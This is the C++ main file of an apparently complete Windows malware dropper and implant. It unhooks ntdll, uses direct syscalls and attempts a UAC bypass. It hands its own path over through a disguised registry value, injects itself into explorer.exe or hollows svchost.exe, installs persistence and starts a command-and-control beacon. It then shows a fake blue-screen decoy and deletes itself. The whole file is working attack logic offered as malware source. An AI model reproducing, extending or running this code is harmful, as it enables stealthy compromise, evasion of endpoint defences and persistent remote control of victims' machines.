#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/UACBypass.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>

namespace {
    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), ::tolower);
        return (sPath.find(L"explorer.exe") != std::wstring::npos || sPath.find(L"svchost.exe") != std::wstring::npos);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    std::wstring cmdLine = GetCommandLineW();

    if (IsSystemProcess()) {
        // We are the injected foothold!
        LOG_INFO("Running as foothold in system process.");

        // Try to find the dropper path from a temporary location (passed via registry for stealth)
        std::wstring dropperPath = L"";
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buf[MAX_PATH];
            DWORD sz = sizeof(buf);
            if (RegQueryValueExW(hKey, L"UpdatePath", NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                dropperPath = buf;
            }
            RegCloseKey(hKey);
        }

        if (!dropperPath.empty()) {
            LOG_INFO("Injected instance installing persistence from: " + utils::ws2s(dropperPath));
            persistence::establishPersistence(dropperPath);
        }

        // Start beacon loop
        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        return 0;
    }

    // Dropper logic
    LOG_INFO("Dropper started.");

    // Check if already persisted (to avoid loop)
    // In a real scenario we'd check if we are running from a persisted path

    if (!utils::IsAdmin()) {
        LOG_INFO("Not admin. Attempting UAC bypass...");
        if (evasion::UACBypass::Execute(GetCommandLineW())) {
            LOG_INFO("UAC Bypass triggered. Exiting dropper.");
            CoUninitialize();
            return 0; // Elevated instance will handle the rest
        }
    }

    // If we are here, we are either admin or UAC bypass failed (so we try as user)

    // Pass our path to the injected instance via registry
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"UpdatePath", 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    LOG_INFO("Attempting injection into explorer.exe...");
    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Injection successful. Dropper exiting.");
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        } else {
            LOG_WARN("Injection into explorer.exe failed. Trying svchost.exe hollowing.");
            wchar_t systemPath[MAX_PATH];
            GetSystemDirectoryW(systemPath, MAX_PATH);
            std::wstring svchost = std::wstring(systemPath) + L"\\svchost.exe";
            if (evasion::Injector::HollowProcess(svchost, selfImage)) {
                LOG_INFO("Hollowing successful.");
                decoy::ShowBSOD();
                CoUninitialize();
                utils::SelfDeleteAndExit();
                return 0;
            }
        }
    }

    // Last resort: install directly from dropper if injection failed
    LOG_WARN("Injection failed. Installing persistence directly from dropper.");
    persistence::establishPersistence();
    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();

    return 0;
}
